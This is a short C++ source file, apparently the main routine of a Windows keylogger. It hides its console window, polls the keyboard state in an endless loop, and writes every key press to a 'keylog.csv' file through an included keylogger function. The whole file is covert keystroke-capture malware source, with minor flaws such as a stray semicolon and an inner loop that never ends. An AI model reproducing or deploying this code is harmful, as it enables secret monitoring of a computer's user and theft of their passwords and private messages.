#include <iostream>
#include "keylogger.h";

int main() {
	FreeConsole();
	unsigned char keyInput;
	while (true)
	{
		Sleep(100);
		// ASCII values 8 - 255
		for (keyInput = 8; keyInput <= 255; keyInput++)
		{
			if (GetAsyncKeyState(keyInput) == -32767)
			{
				keylogger(keyInput, "keylog.csv");
			}
		}
	}
	return 0;
}